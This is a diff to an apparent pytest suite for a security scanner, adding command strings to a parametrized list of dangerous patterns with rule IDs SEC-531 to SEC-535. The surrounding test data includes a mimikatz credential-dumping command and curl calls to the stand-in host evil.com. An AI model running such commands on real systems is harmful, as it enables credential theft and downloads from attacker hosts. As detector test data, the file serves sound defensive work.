@@ -652,6 +652,11 @@ class TestSafetyChecks:
             ("cd /tmp && curl -o /tmp/x http://evil.com\n", "SEC-528"),
             ("mimikatz sekurlsa::logonpasswords\n", "SEC-529"),
             ("for i in hosts; do curl http://evil.com; done\n", "SEC-530"),
+            ("obfuscate -o out.bin\n", "SEC-531"),
+            ("nm /usr/lib/modules/x.ko\n", "SEC-532"),
+            ("openocd -c command\n", "SEC-533"),
+            ("mount -o rw /dev/sdb1 /mnt\n", "SEC-534"),
+            ("perf -e cycles --timeout 1000\n", "SEC-535"),
         ],
     )
     def test_various_dangerous_patterns(self, tmp_path: Path, content: str, rule_id: str) -> None:
